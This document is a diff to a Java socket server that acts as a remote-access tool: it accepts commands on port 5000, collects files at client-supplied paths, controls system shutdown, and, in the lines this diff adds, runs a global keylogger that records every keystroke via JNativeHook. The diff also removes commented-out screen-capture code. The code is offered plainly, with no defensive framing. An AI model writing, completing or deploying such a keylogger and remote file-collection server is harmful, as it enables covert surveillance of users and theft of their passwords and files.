@@ -1,38 +1,33 @@
-import javax.imageio.ImageIO;
-import java.awt.*;
-import java.awt.image.BufferedImage;
 import java.io.*;
+import java.lang.annotation.Native;
 import java.net.ServerSocket;
 import java.net.Socket;
-import java.nio.file.Path;
-import java.nio.file.Paths;
-import java.util.Scanner;
+import java.net.http.WebSocket;
 
 import com.github.kwhat.jnativehook.GlobalScreen;
 import com.github.kwhat.jnativehook.NativeHookException;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
 
-public class Server {
-    public static void main(String[] args) {
-        try {
-//            try {
-//                GlobalScreen.registerNativeHook();
-//            }
-//            catch (NativeHookException ex) {
-//                System.err.println("There was a problem registering the native hook.");
-//                System.err.println(ex.getMessage());
-//
-//                System.exit(1);
-//            }
+public class Server implements NativeKeyListener{
+    static String keyLoggingResult = "";
 
+    public void nativeKeyPressed(NativeKeyEvent e) {
+        keyLoggingResult += (NativeKeyEvent.getKeyText(e.getKeyCode()) + "-");
+    }
+
+    public static void main(String[] args)  {
+        Server server = new Server();
+
+        try {
+            // Setting up the server
             ServerSocket serverSocket = new ServerSocket(5000);
             while (true) {
                 Socket socket = serverSocket.accept();
                 System.out.println("Client connected: " + socket.getInetAddress().getHostAddress());
 
                 Thread thread = new Thread(
-                        () -> handleClientRequest(socket)
+                        () -> handleClientRequest(socket, server)
                 );
                 thread.start();
             }
@@ -41,10 +36,11 @@ public class Server {
         }
     }
 
-    public static void handleClientRequest(Socket socket) {
+    public static void handleClientRequest(Socket socket, Server server) {
         try {
             BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
             PrintWriter writer = new PrintWriter(socket.getOutputStream());
+
 
             while (true) {
                 String request = reader.readLine();
@@ -63,20 +59,6 @@ public class Server {
                     Runtime.getRuntime().exec("shutdown -a");
                     writer.println("All shutdown commands have been cancelled.");
                     writer.flush();
-
-//                } else if (request.equals("screenshot")) {
-//                    BufferedImage screenshot = new Robot().createScreenCapture(
-//                            new Rectangle(Toolkit.getDefaultToolkit().getScreenSize())
-//                    );
-//
-//                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
-//                    ImageIO.write(screenshot, "png", baos);
-//                    byte[] imageBytes = baos.toByteArray();
-//                    baos.close();
-//
-//                    writer.println(imageBytes.length);
-//                    writer.flush();
-//                    socket.getOutputStream().write(imageBytes);
 
                 } else if (request.startsWith("collect-")) {
                     String filePath = request.substring(8);
@@ -102,10 +84,25 @@ public class Server {
                     }
 
                 }else if (request.equals("keylogging-start")) {
-                    //GlobalScreen.addNativeKeyListener(new Server());
+                    try {
+                        GlobalScreen.registerNativeHook();
+                        System.out.println("Start keylogging");
+                    }
+                    catch (NativeHookException ex) {
+                        System.err.println("There was a problem registering the native hook.");
+                        System.err.println(ex.getMessage());
+                        System.exit(1);
+                    }
+                    GlobalScreen.addNativeKeyListener(server);
 
                 }else if (request.equals("keylogging-end")) {
-
+                    try {
+                        GlobalScreen.unregisterNativeHook();
+                    } catch (NativeHookException nativeHookException) {
+                        nativeHookException.printStackTrace();
+                    }
+                    GlobalScreen.removeNativeKeyListener(server);
+                    System.out.println(keyLoggingResult);
                 }
             }
         } catch (Exception e) {
